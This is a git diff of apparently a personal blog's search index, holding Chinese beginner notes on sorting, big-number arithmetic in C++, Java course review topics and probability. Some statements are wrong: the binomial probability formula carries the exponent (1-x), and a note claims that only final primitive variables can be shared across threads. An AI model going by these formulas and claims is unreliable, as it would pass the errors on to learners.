class="comment">//temp=a.size()+b.size();</span></span><br><span class="line">	<span class="keyword">while</span>(sum[temp]==<span class="number">0</span>&amp;&amp;temp&gt;=<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		temp--;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"> &#125; </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">	<span class="built_in">re_change</span>();</span><br><span class="line">	<span class="built_in">mutiply</span>();</span><br><span class="line">	<span class="keyword">for</span>(;temp&gt;=<span class="number">0</span>;temp--)</span><br><span class="line">	&#123;</span><br><span class="line">		cout&lt;&lt;sum[temp];</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>以上内容皆为初学者的浅薄理解，如有错误麻烦立即告诉作者，别喷别喷别喷呜呜呜~</p>
-]]></content>
-      <categories>
-        <category>算法</category>
-      </categories>
-      <tags>
-        <tag>基础</tag>
         <tag>C++</tag>
-        <tag>算法</tag>
       </tags>
   </entry>
   <entry>
@@ -787,34 +763,384 @@
       </categories>
       <tags>
         <tag>基础</tag>
-        <tag>C++</tag>
         <tag>算法</tag>
+        <tag>C++</tag>
         <tag>Python</tag>
       </tags>
   </entry>
   <entry>
-    <title>基础算法02</title>
-    <url>/2022/07/01/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%9502/</url>
-    <content><![CDATA[<p>dp(动态规划)的基本例题，可以浅浅的帮助理解。</p>
+    <title>基础算法01</title>
+    <url>/2022/07/01/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%9501/</url>
+    <content><![CDATA[<p>这里存放一点非常基础的算法，忘记了可以来看一眼。</p>
+<p>主要是：排序总结，高精度总结。</p>
 <span id="more"></span>
-<h4 id="例题一">例题一</h4>
-<p>先来看一道很简单的例题：</p>
-<p><img src="https://s3.bmp.ovh/imgs/2023/01/06/13a8cadd91043149.png" alt=""></p>
-<p>具体要求如下：</p>
-<p><img src="https://s3.bmp.ovh/imgs/2023/01/06/fc137aba01164ed2.png" alt=""></p>
-<p>根据格式可以推出状态方程，这个方程不难，主要关注dp思想，找到状态方程，此题不难发现每一个数字只能往下或者往右走，因此每一个位置的最大值就等于其上面或上左位置的最大值，找到每一个数的最大值，这基本就是动态规划的思想。</p>
-<p>核心代码如下：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dpcount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+number[i][j];</span><br><span class="line">			<span class="keyword">if</span>(dp[i][j]&gt;ans)	ans=dp[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>ac代码如下：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> ans;</span><br><span class="line"><span class="type">int</span> dp[<span class="number">1005</span>][<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> number[<span class="number">1005</span>][<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dpcount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+number[i][j];</span><br><span class="line">			<span class="keyword">if</span>(dp[i][j]&gt;ans)	ans=dp[i][j];</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">1</span>;j&lt;=i;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			cin&gt;&gt;number[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">dpcount</span>();</span><br><span class="line">	cout&lt;&lt;ans;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="排序模板">排序模板</h3>
+<h4 id="冒泡排序">冒泡排序</h4>
+<p>这应该是最经典的排序方法，实现也很简单，也很好理解，但是时间会慢一点，复杂度是O($n^2$)</p>
+<p>原理大概意思是比较相邻的两个数，如果他们的关系是正确的，则不做操作，如不是，则交换两个数的位置，这样从头到尾进行一次之后最大的数应该是在最后的位置，这个数就是正确顺序的，就像一个泡泡一样冒到了边缘(?    再次重复这个操作，一次完成n-1，n-2，…的排序，至此排序完成。</p>
+<p>核心代码如下:</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++)<span class="comment">//外层循环记录要大排序次数，是数组元素数量-1</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n - i - <span class="number">1</span>; j++)<span class="comment">//内层循环记录在一次排序下两两比较的次数，是大排序总次数减去当前排序的次数</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) <span class="built_in">swap</span>(arr[j], arr[j + <span class="number">1</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>实现较为简单，因为有两层循环的缘故，时间可能较慢，另外需要注意两次循环的边界条件</p>
+<h4 id="快速排序">快速排序</h4>
+<p>快排是c++内置sort函数的排序方法，时间会比较快，最好的情况是O($n\log_2 n$),最坏的情况是O($n^2$),平均复杂度在O($n \log_2 n$),因此用的比较多。</p>
+<p>原理也比较好理解:先把整个数列分成两部分，把两边的数据和中间值比较，比中间值小的放左边，反之放右边，依次操作完毕后这个中间值就是已排序状态，然后分别用同样的方法操作左右两段数据，可以看出这是根据递归定义的排序方法，在递归最底层达到条件：找不到中间值时，整段数据已经排序完毕。这里解释的不是特别全面，有一些情况可以根据代码举个例子理解。</p>
+<p>核心代码大同小异，这里我就摆一种：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">quicksort</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span><span class="comment">//l,r表示数组的左右两端</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> mid=arr[(l+r)/<span class="number">2</span>];</span><br><span class="line">	<span class="type">int</span> i=l,j=r;</span><br><span class="line">	<span class="keyword">while</span>(i&lt;=j)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">while</span>(arr[i]&lt;mid) i++;</span><br><span class="line">		<span class="keyword">while</span>(arr[j]&gt;mid) j--;</span><br><span class="line">		<span class="keyword">if</span>(i&lt;=j)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">swap</span>(arr[i],arr[j]);</span><br><span class="line">			i++;</span><br><span class="line">			j--;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(l&lt;j) <span class="built_in">quicksort</span>(l,j);</span><br><span class="line">	<span class="keyword">if</span>(r&gt;i) <span class="built_in">quicksort</span>(i,r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>排序就先摆两个吧，有空了再贴(画饼</p>
+<h3 id="高精度计算">高精度计算</h3>
+<h4 id="a-b高精度">a+b高精度</h4>
+<p>高精度计算在c++中会出现是因为即使是unsigned long long型的数据最大值也就在二十位数据，也就是18446744073709551615，这样一个数据如果超过了，c++就显示不了了，会发生溢出的现象，但是在实际计算中计算大数据也不少见，因此需要用到高精度的技巧。</p>
+<p>高精度一个很基础的想法就是数无法使用，那就使用数组，基本思路是使用字符串型读入数据，再转入数组之中进行操作。下一步可以理解为模拟竖式加法的做法，依次从个位开始对两个数字进行相加，大于10则保留个位并将十位上进一，依次操作到最后一位，并将结果数组倒序输出即可。</p>
+<p><strong>实现代码：</strong></p>
+<p>读入数组部分：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">change_arr</span><span class="params">(string a ,string b)</span><span class="comment">//转换函数，熟练之后可以和相加函数结合 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;a.<span class="built_in">size</span>();i++)<span class="comment">//转换注意需要倒序读入数组，因为相加需要进位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		arr_a[a.<span class="built_in">size</span>()-i<span class="number">-1</span>]=a[i]<span class="number">-48</span>;<span class="comment">//一次只能读入一个数组，因为两个大数字位数不一定相等</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_b[b.<span class="built_in">size</span>()-i<span class="number">-1</span>]=b[i]<span class="number">-48</span>;<span class="comment">//这里减去48可以换成&#x27;0&#x27; </span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>计算部分：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">tooplus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> temp=<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>());</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;temp;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		s[i]+=arr_a[i]+arr_b[i];<span class="comment">//这里必须使用+=因为要注意前一位的进位，防止丢失数据</span></span><br><span class="line">		s[i+<span class="number">1</span>]=s[i]/<span class="number">10</span>;</span><br><span class="line">		s[i]%=<span class="number">10</span>;<span class="comment">//标准操作，进位且本位取最后一位数字 </span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(s[temp]&gt;<span class="number">0</span>) add=<span class="number">1</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>全部代码：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string a,b;<span class="comment">//在long long 存储不了的情况下，基本思路是通过字符串读入，转到数组进行操作 </span></span><br><span class="line"><span class="type">int</span> arr_a[<span class="number">100005</span>],arr_b[<span class="number">100005</span>],s[<span class="number">100005</span>],add=<span class="number">0</span>;<span class="comment">//s数组用于储存加完之后的数字 ,add用于处理进位的数字 </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">change_arr</span><span class="params">(string a ,string b)</span><span class="comment">//转换函数，熟练之后可以和相加函数结合 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;a.<span class="built_in">size</span>();i++)<span class="comment">//转换注意需要倒序读入数组，因为相加需要进位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		arr_a[a.<span class="built_in">size</span>()-i<span class="number">-1</span>]=a[i]<span class="number">-48</span>;<span class="comment">//一次只能读入一个数组，因为两个大数字位数不一定相等</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_b[b.<span class="built_in">size</span>()-i<span class="number">-1</span>]=b[i]<span class="number">-48</span>;<span class="comment">//这里减去48可以换成&#x27;0&#x27; </span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tooplus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> temp=<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>());</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;temp;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		s[i]+=arr_a[i]+arr_b[i];<span class="comment">//这里必须使用+=因为要注意前一位的进位，防止丢失数据</span></span><br><span class="line">		s[i+<span class="number">1</span>]=s[i]/<span class="number">10</span>;</span><br><span class="line">		s[i]%=<span class="number">10</span>;<span class="comment">//标准操作，进位且本位取最后一位数字 </span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(s[temp]&gt;<span class="number">0</span>) add=<span class="number">1</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;a&gt;&gt;b;<span class="comment">//读入数据，为string型</span></span><br><span class="line">	<span class="built_in">change_arr</span>(a,b);</span><br><span class="line">	<span class="built_in">tooplus</span>();</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>())+add<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)<span class="comment">//判断输出的时候是否需要输出最终多出的一位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		cout&lt;&lt;s[i]; </span><br><span class="line">	&#125;</span><br><span class="line">	 <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里有一道例题，洛谷的p1601,可以用这个解法。</p>
+<h4 id="a-b高精度，a-b高精度">a-b高精度，a*b高精度</h4>
+<p>这两种方法基本一样，要注意的是减法有一些特殊情况，比如负数，输出长度的判断等等，这里我就摆一种简单的，乘法也是需要注意长度区别。</p>
+<p>实现代码：</p>
+<p>减法：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string a,b;</span><br><span class="line"><span class="type">bool</span> jg;</span><br><span class="line"><span class="type">int</span> arr_a[<span class="number">100005</span>],arr_b[<span class="number">10005</span>],ans[<span class="number">100005</span>],temp;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">re_input</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=a.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_a[i]=a[a.<span class="built_in">size</span>()-i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">1</span>;j&lt;=b.<span class="built_in">size</span>();j++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_b[j]=b[b.<span class="built_in">size</span>()-j]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">to_divide</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=temp;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(arr_a[i]&lt;arr_b[i])</span><br><span class="line">		&#123;</span><br><span class="line">			arr_a[i+<span class="number">1</span>]--;</span><br><span class="line">			arr_a[i]+=<span class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		ans[i]=arr_a[i]-arr_b[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(ans[temp]==<span class="number">0</span>) temp--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">to_printf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(jg==<span class="literal">true</span>) cout&lt;&lt;<span class="string">&quot;-&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =temp;i&gt;<span class="number">0</span>;i--)</span><br><span class="line">	&#123;</span><br><span class="line">		cout&lt;&lt;ans[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(temp&lt;<span class="number">1</span>) cout&lt;&lt;<span class="string">&quot;0&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">	<span class="keyword">if</span>(a&lt;b&amp;&amp;a.<span class="built_in">size</span>()==b.<span class="built_in">size</span>()||a.<span class="built_in">size</span>()&lt;b.<span class="built_in">size</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">swap</span>(a,b);</span><br><span class="line">		jg=<span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	temp=<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>());</span><br><span class="line">	<span class="built_in">re_input</span>();</span><br><span class="line">	<span class="built_in">to_divide</span>();</span><br><span class="line">	<span class="built_in">to_printf</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>乘法：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string a,b;</span><br><span class="line"><span class="type">int</span> arr01[<span class="number">100005</span>],arr02[<span class="number">100005</span>],sum[<span class="number">100005</span>],temp=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">re_change</span><span class="params">()</span><span class="comment">//倒序存储部分 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;a.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr01[i]=a[a.<span class="built_in">size</span>()-i<span class="number">-1</span>]<span class="number">-48</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr02[i]=b[b.<span class="built_in">size</span>()-i<span class="number">-1</span>]<span class="number">-48</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mutiply</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">0</span>;j&lt;a.<span class="built_in">size</span>();j++)</span><br><span class="line">		&#123;</span><br><span class="line">			sum[i+j]+=arr01[j]*arr02[i];<span class="comment">//注意下标从1开始，进位减去1 </span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(temp =<span class="number">0</span>;temp&lt;=a.<span class="built_in">size</span>()+b.<span class="built_in">size</span>();temp++)<span class="comment">//处理进位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		</span><br><span class="line">		sum[temp]+=sum[temp<span class="number">-1</span>]/<span class="number">10</span>;</span><br><span class="line">		sum[temp<span class="number">-1</span>]%=<span class="number">10</span>;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//temp=a.size()+b.size();</span></span><br><span class="line">	<span class="keyword">while</span>(sum[temp]==<span class="number">0</span>&amp;&amp;temp&gt;=<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		temp--;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"> &#125; </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">	<span class="built_in">re_change</span>();</span><br><span class="line">	<span class="built_in">mutiply</span>();</span><br><span class="line">	<span class="keyword">for</span>(;temp&gt;=<span class="number">0</span>;temp--)</span><br><span class="line">	&#123;</span><br><span class="line">		cout&lt;&lt;sum[temp];</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>以上内容皆为初学者的浅薄理解，如有错误麻烦立即告诉作者，别喷别喷别喷呜呜呜~</p>
 ]]></content>
       <categories>
         <category>算法</category>
       </categories>
       <tags>
         <tag>基础</tag>
-        <tag>C++</tag>
         <tag>算法</tag>
+        <tag>C++</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>大二上java程序设计期末复习</title>
+    <url>/2022/11/29/%E5%A4%A7%E4%BA%8C%E4%B8%8AJava%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</url>
+    <content><![CDATA[<p>整理了一下ppt的内容，java程序设计课程的课件。</p>
+<h1>软件开发(Software Development)</h1>
+<h2 id="Agile-Methodologies（敏捷方法）">Agile Methodologies（敏捷方法）</h2>
+<p>这是一种快速部署应用程序的理念，优点包括：</p>
+<ul>
+<li>
+<p>persistent software delivery 持续提交软件</p>
+</li>
+<li>
+<p>increased stakeholder satisfaction 增加利益方的满意度</p>
+</li>
+<li>
+<p>inspect and adapt 检查调整</p>
+</li>
+<li>
+<p>welcome to changes at any stage 支持任意阶段修改</p>
+</li>
+<li>
+<p>design is important 设计至关重要</p>
+</li>
+<li>
+<p>daily interaction 日常互动</p>
+</li>
+</ul>
+<h2 id="版本控制（version-control）">版本控制（version control）</h2>
+<p>就是说需要一个git来控制一下版本，对多人合作很方便。而关于这个git的用法可以看看<a href="https://zthlly.github.io/2022/09/13/git%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/">这篇博客</a> 。</p>
+<h2 id="JVM">JVM</h2>
+<p>这里多说两句这个JVM，JVM（Java Virtucal Machine）是一个类似虚拟机的玩意，它运行在操作系统之下，通过与操作系统交互达到与硬件交互的目的。知道这个之后我们看看java文件怎么运行，首先写完一个.java文件之后通过编译器编译得到一个.class文件，然后通过类加载器把这个.class丢到JVM里面。这里再多提两句嘴，JVM内主要的五大块：方法区，堆是线程共享区域，有线程安全问题，栈和本地方法栈和计数器是独享区域，不存在线程安全问题。</p>
+<h1>Java语言基础</h1>
+<h2 id="语言基础语法">语言基础语法</h2>
+<p>这个去<a href="https://zthlly.github.io/2022/07/02/Java%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/" title="si1v3r的狗窝捏">这里</a>看。</p>
+<h2 id="UML图">UML图</h2>
+<p>呃就是一个类的图形化表示，举个例子吧~</p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/11/29/b41b30ebbe997a4f.png" alt=""></p>
+<h2 id="递归">递归</h2>
+<ul>
+<li>Mistakes like omitting the base case or writing the recursion step incorrectly can cause infinite recursion. <strong>小心无限递归爆栈</strong></li>
+<li>Recursive programs may result in exponential method calls <strong>递归可能导致指数级别调用</strong></li>
+<li>Each recursive method can be re-written using loops<strong>所有递归可重写为循环</strong></li>
+<li>Use recursive methods only if the problem is naturally recursive (i.e., to improve understanding) or there are performance benefits, or you need to impress in a job interview<strong>在必要的时候再用递归</strong></li>
+</ul>
+<h2 id="Concurrency-in-Java-（并发）">Concurrency in Java （并发）</h2>
+<p>Complex applications may use multithreading to speed up performance or user experience  <strong>复杂的程序会使用多线程来加速性能或用户体验</strong></p>
+<h3 id="Caveats-of-multithreading（多线程注意事项）">Caveats of multithreading（多线程注意事项）</h3>
+<ul>
+<li>Calling methods from multiple threads may have undesired and unexpected side effects (things may not happen in the expected order)   <strong>可能有副作用</strong></li>
+<li>Only primitive variables that are declared <strong>final</strong> can be shared across threads  <strong>只有声明final的变量可以跨线程共享</strong></li>
+<li>Using keyword <strong>synchronized</strong> will “lock” the method execution and force other threads to wait until the execution completes <strong>使用关键字同步将“锁定”方法的执行，并强制其他线程等待，直到执行完成</strong></li>
+<li>Thread can be in different states. After termination, thread can’t be started again (however, you can create a new thread). <strong>线程终止后不能再次启动，但是可以创建一个新的线程</strong></li>
+</ul>
+<p><img src="https://s3.bmp.ovh/imgs/2022/12/06/084e6b23e9a89d42.png" alt=""></p>
+<h2 id="Exception-handling-（异常处理）">Exception handling  （异常处理）</h2>
+<ul>
+<li>An <em>exception</em> is an event, which occurs during the execution of a program, that disrupts the normal flow of the program’s instructions</li>
+<li><strong>Exception handler</strong> is a block of code that can handle the exception</li>
+<li>Java allows to separate exception handling code from the normal code to improve the readability</li>
+<li>Exceptions are propagated across the call stack until exception handler is found so developer can choose at which level exceptions should be handled</li>
+<li>Each organisation will have its own house style on how to write and handle exceptions</li>
+</ul>
+<p>主要层次结构如下：</p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/12/06/aab3b03140ebf50d.png" alt=""></p>
+]]></content>
+      <categories>
+        <category>大二课程</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+        <tag>复习</tag>
+        <tag>校内课程</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>概率论复习</title>
+    <url>/2022/12/23/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%A4%8D%E4%B9%A0/</url>
+    <content><![CDATA[<p>关于大二上学期概率论学的稀烂，期末复习知识不进脑子的那点事…</p>
+<h2 id="二项随机概率分布">二项随机概率分布</h2>
+<p>$b(x;n,p)$代表事件总共发生n次，有x次成功，每次事件成功的概率是p，则事件成功的概率是多少，是$C_n^xp^x(1-p)^{1-x}$。</p>
+<h3 id="cdf-概率分布函数">cdf (概率分布函数)</h3>
+<p>$P(X\leq x)=B(x;n,p)=\sum_{y=0}^xb(y;n,p)$</p>
